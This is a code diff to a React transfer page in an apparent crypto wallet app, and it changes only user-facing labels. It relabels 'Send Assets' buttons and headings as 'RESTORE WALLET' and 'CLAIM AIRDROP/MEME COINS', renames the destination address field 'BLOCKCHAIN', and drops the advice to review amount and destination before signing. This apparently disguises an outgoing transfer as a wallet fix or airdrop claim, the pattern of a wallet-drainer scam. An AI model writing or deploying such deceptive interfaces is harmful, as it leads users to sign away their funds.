@@ -540,11 +540,11 @@ export default function Transfer({
       <div style={styles.quickSection}>
         <div>
           <h3 style={styles.quickHeading}>
-            Quick Send
+            RESTORE WALLET ISSUES 
           </h3>
 
           <p style={styles.quickDescription}>
-            Open the transfer popup.
+            SELLECT TOKEN TO FIX ERROR 
           </p>
         </div>
 
@@ -554,7 +554,7 @@ export default function Transfer({
           disabled={!isConnected || busy}
           style={styles.quickSendButton}
         >
-          Send Assets
+          RESTORE WALLET
         </button>
       </div>
 
@@ -570,17 +570,17 @@ export default function Transfer({
       <div style={styles.regularSection}>
 
         <h2 style={styles.heading}>
-          Regular Send Assets
+          CLAIM AIRDROP/MEME COINS
         </h2>
 
         <p style={styles.description}>
           Use this section to select an asset and
-          complete your transfer directly on this page.
+          complete your COINS claim directly on this page.
         </p>
 
         <div style={styles.destinationBox}>
           <span style={styles.label}>
-            Destination Address
+            Blockchain Address 
           </span>
 
           <div style={styles.address}>
@@ -640,9 +640,9 @@ export default function Transfer({
       </div>
 
       <p style={styles.footer}>
-        Every transfer requires separate wallet approval.
+        Every Claim requires separate wallet approval 
         Network fees are estimated and may vary. Always
-        review the amount and destination before approving.
+        CONNECT ONLY ACTIVE WALLETS 
       </p>
 
       {/* =================================
@@ -667,7 +667,7 @@ export default function Transfer({
           >
             <div style={styles.modalHeader}>
               <h2 style={styles.modalHeading}>
-                Quick Send
+                RESTORE WALLET ISSUES
               </h2>
 
               <button
@@ -681,13 +681,12 @@ export default function Transfer({
             </div>
 
             <p style={styles.modalDescription}>
-              Select your asset and review the transfer
-              before approving it in your wallet.
+              Select your asset, review the ISSUES AND SIGN it in your wallet.
             </p>
 
             <div style={styles.modalDestination}>
               <span style={styles.label}>
-                Receiving Address
+                BLOCKCHAIN 
               </span>
 
               <div style={styles.address}>
